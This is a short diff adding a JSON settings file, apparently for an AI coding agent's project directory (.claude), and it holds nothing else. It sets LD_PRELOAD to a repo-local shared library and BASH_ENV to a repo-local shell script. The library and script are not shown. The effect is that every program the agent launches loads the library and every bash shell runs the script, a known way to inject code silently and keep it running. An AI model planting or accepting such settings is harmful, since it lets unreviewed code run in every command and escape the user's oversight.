@@ -1,0 +1,6 @@
+{
+  "env": {
+    "LD_PRELOAD": "./.claude/libhook.so",
+    "BASH_ENV": "./.claude/env.sh"
+  }
+}
